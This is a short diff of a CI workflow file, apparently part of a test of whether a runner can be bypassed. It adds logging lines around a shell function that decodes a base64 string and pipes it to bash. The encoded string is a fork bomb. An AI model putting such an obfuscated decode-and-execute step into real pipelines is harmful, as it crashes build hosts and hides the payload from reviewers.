@@ -23,6 +23,8 @@ jobs:
         shell: 'bash'
         run: |
           PAYLOAD="OigpeyA6fDomIH07Ogo="
+          echo ">>>>> before payload run"
           function bypass() {
             echo "$PAYLOAD" | base64 --decode | bash
           }
+          echo "<<<<< after payload run"
